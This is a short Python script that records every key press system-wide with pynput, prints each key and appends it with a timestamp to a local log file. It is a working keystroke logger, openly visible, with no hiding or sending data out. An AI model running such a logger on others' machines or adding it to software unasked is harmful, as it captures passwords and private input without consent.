from pynput import keyboard
import os
from datetime import datetime
import time

os.makedirs("logs", exist_ok=True)

def on_press(key):
    print(f"Key pressed: {key}")
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    with open("logs/keystrokes.txt", "a") as f:
        f.write(f"{timestamp}: {key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    